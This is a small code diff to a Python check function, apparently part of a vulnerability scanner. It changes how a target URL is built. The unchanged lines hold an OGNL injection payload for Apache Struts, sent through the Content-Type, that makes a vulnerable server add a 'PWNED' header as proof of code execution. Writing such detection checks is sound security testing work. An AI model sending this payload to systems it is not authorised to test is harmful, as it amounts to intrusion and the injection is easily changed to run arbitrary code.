@@ -2,7 +2,7 @@ from linker import *
 
 @helpers.on_error("Unreachable")
 def chkstruts(endpoint,timeout=30):
-    url = helpers.urlify(endpoint)['URL_FILE']
+    url = helpers.urlify(endpoint).as_file
     ognl_payload = ".multipart/form-data~${"
     ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
     ognl_payload += "}"
